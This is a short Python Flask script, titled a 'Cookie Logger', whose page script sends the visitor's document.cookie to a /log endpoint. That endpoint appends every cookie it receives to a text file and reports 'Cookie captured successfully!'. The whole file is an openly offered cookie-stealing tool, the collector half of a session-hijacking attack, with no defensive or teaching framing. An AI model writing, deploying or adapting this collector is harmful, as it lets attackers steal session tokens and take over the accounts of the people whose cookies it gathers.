from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def index():
    return '''
    <h1>Tahir Iqbal Cookie Logger</h1>
    <script>
        document.location='log?cookie='+document.cookie;
    </script>
    '''

@app.route('/log')
def log():
    cookie = request.args.get('cookie')
    if cookie:
        with open('cookies.txt', 'a') as file:
            file.write(cookie + '\n')
        return "Cookie captured successfully!"
    return "No cookies found!"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
